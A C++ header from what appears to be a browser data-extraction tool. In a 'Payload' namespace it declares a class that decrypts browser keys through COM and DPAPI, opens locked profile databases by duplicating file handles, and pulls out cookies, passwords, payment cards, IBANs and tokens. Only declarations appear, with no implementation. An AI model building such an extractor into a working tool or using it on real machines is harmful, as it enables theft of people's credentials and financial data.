// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#pragma once

#include "../core/common.hpp"
#include "pipe_client.hpp"
#include "../../libs/sqlite/sqlite3.h"
#include <vector>
#include <string>
#include <optional>

namespace Payload {

    // Forward declaration
    struct KeyBundle;

    class DataExtractor {
    public:
        // Changed: Now accepts KeyBundle instead of single key
        DataExtractor(PipeClient& pipe, const KeyBundle& keys, const std::filesystem::path& outputBase);

        void ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName);

    private:
        sqlite3* OpenDatabase(const std::filesystem::path& dbPath);
        
        sqlite3* OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath);
        
        void CleanupTempFiles();
        
        // Helper function for smart decryption with prefix detection
        std::optional<std::vector<uint8_t>> DecryptWithPrefixDetection(const std::vector<uint8_t>& encrypted);
        
        // Extraction methods
        void ExtractCookies(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractPasswords(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractCards(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractIBANs(sqlite3* db, const std::filesystem::path& outFile);
        void ExtractTokens(sqlite3* db, const std::filesystem::path& outFile);

        std::string EscapeJson(const std::string& s);

        PipeClient& m_pipe;
        std::optional<std::vector<uint8_t>> m_appKey;  // COM-decrypted key
        std::optional<std::vector<uint8_t>> m_osKey;   // DPAPI-decrypted key
        std::filesystem::path m_outputBase;
        
        std::vector<std::filesystem::path> m_tempFiles;
    };

    // KeyBundle structure definition
    struct KeyBundle {
        std::optional<std::vector<uint8_t>> appKey;  // COM-decrypted app-bound key
        std::optional<std::vector<uint8_t>> osKey;   // DPAPI-decrypted os_crypt key
        
        bool HasAnyKey() const {
            return appKey.has_value() || osKey.has_value();
        }
    };

}